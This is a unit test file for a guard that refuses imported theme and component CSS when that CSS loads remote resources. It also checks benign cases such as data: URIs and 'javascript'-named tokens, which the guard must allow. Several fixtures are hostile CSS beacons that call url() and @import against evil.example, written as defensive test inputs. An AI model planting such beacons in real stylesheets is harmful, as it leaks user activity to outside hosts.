/**
 * Unit: what an imported `.zip`'s CSS is refused for — and, just as load-bearing,
 * what it is NOT refused for.
 *
 * This runs on the PER-PR tier. The e2e that drives a hostile bundle through the real
 * Library door lives in `docs/e2e/theme-import-style-sink.spec.ts` and only runs
 * NIGHTLY (it carries no `@smoke` tag, and CI's e2e step is `test:e2e:smoke`), so
 * deleting the guard would have left the per-PR gate green. A guard on untrusted
 * third-party input needs a test that actually blocks a merge.
 *
 * THE FALSE-POSITIVE CASES ARE THE POINT OF THIS FILE. A refusal destroys work, so
 * over-refusing is a defect and not a safe default — the first cut of this guard put
 * the refusal in `saveStudioTheme`, where these same inputs made a legitimate theme
 * permanently unsaveable and made one theme in your own backup abort the entire
 * workspace restore.
 */

import { describe, expect, it } from 'vitest';
import { refuseImportedComponent, refuseImportedTheme } from './import-gate';

const CLEAN_THEME = "/* @theme mine */\n@import 'lattice';\n:root{--accent:#2f6feb;--bg:#fff;--text-body:#111}";

describe('refuseImportedTheme', () => {
	it('refuses a remote url() — the beacon', () => {
		const r = refuseImportedTheme(`${CLEAN_THEME}\n:root{--leak:url(https://evil.example/?deck)}`, 'Hostile');
		expect(r).not.toBeNull();
		expect(r?.why).toMatch(/remote resource/);
		expect(r?.name).toBe('Hostile');
	});

	it('refuses @import url(…)', () => {
		expect(refuseImportedTheme(`@import url(https://evil.example/x.css);\n${CLEAN_THEME}`, 'X')).not.toBeNull();
	});

	it('refuses an import of a theme the receiving browser does not have', () => {
		// It would not resolve there anyway, and since #1841 the engine drops rather
		// than hoists it — but a stranger's bundle asserting a palette you may or may
		// not have is not something to store on a maybe.
		expect(refuseImportedTheme("@import 'someones-palette';\n:root{--accent:#111}", 'X')).not.toBeNull();
	});

	it('allows a clean theme', () => {
		expect(refuseImportedTheme(CLEAN_THEME, 'Mine')).toBeNull();
	});

	it('allows a token whose NAME contains "javascript"', () => {
		// `CSS_EXFIL_RULES`'s `css-scheme` rule matches `javascript:` inside the property
		// name, so a plausible syntax-highlight token trips it. Measured against the gate:
		// `blocked: true`. It is a finding, never a refusal — a `javascript:` URL in a
		// stylesheet cannot execute in any shipping browser, so vetoing on it buys
		// nothing and costs a legitimate import.
		expect(refuseImportedTheme(`${CLEAN_THEME}\n:root{--code-javascript:#f0db4f}`, 'Code')).toBeNull();
	});

	it('allows a theme that merely fails the token contract', () => {
		// Wrong, and it still renders. Conformance is never a refusal.
		expect(refuseImportedTheme("/* @theme sparse */\n@import 'lattice';\n:root{--accent:#111}", 'Sparse')).toBeNull();
	});

	it('allows a data: URI and a #fragment ref', () => {
		const css = `${CLEAN_THEME}\n:root{--icon:url("data:image/svg+xml;base64,PHN2Zy8+");--clip:url(#frag)}`;
		expect(refuseImportedTheme(css, 'Inline')).toBeNull();
	});
});

describe('refuseImportedComponent', () => {
	it('refuses a remote url() in component CSS', () => {
		// The component arm of the SAME zip was ungated while the theme arm was not.
		// Hostile component CSS reaches the same preview <style> and every export, and
		// the intended workflow — import, then insert the skeleton — is what fires it.
		const r = refuseImportedComponent('section.widget .leak{background:url(https://evil.example/?d)}', 'widget');
		expect(r).not.toBeNull();
		expect(r?.why).toMatch(/remote resource/);
	});

	it('refuses @import in component CSS', () => {
		expect(refuseImportedComponent("@import url(//evil.example/x);\nsection.w .a{color:red}", 'w')).not.toBeNull();
	});

	it('allows clean scoped component CSS', () => {
		expect(refuseImportedComponent('section.widget .title{color:var(--text-heading)}', 'widget')).toBeNull();
	});

	it('allows a component whose class is named "javascript"', () => {
		// A code component naming a language class is exactly the shape that trips the
		// `css-scheme` rule on a SELECTOR rather than on a URL.
		expect(refuseImportedComponent('section.code .javascript{color:var(--accent)}', 'code')).toBeNull();
	});

	it('allows an inline data: icon — the sanctioned non-network url()', () => {
		expect(refuseImportedComponent('section.w .i{background:url("data:image/svg+xml;base64,PHN2Zy8+")}', 'w')).toBeNull();
	});
});
